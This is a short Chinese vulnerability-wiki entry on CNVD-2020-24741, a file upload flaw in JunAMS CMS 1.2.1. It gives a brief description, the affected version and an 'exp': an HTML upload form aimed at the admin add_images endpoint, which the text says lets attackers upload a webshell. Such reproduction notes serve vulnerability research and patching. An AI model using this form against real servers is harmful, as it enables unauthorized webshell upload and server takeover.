---
title: "JunAms内容管理系统文件上传漏洞 CNVD-2020-24741"
date: 2026-10-12 09:00:36
categories:
  - WebSecurity
  - CVE
  - "cms"
  - "JunAms内容管理系统"
tags:
  - "JunAms内容管理系统"
  - "文件上传"
  - "CNVD-2020-24741"
  - "漏洞复现"
---
## 漏洞描述

JunAMS是一款以ThinkPHP为框架的开源内容管理系统。

JunAMS内容管理系统存在文件上传漏洞，攻击者可利用该漏洞上传webshell，获取服务器权限。

参考链接：

- https://www.cnvd.org.cn/flaw/show/CNVD-2020-24741

## 漏洞影响

```
JunAMS junAMS 1.2.1.20190403
```

## 漏洞复现

exp：

```
<form enctype="multipart/form-data" action="http://localhost//admin.php/common/add_images.html" method="post">  
<input type="file" name="file" size="50"><br>  
<input type="submit" value="Upload">  
</form>
```

---

> 资料整理自 [Threekiii/Vulnerability-Wiki](https://github.com/Threekiii/Vulnerability-Wiki/blob/master/docs-base/docs/cms/JunAms%E5%86%85%E5%AE%B9%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E-CNVD-2020-24741.md)
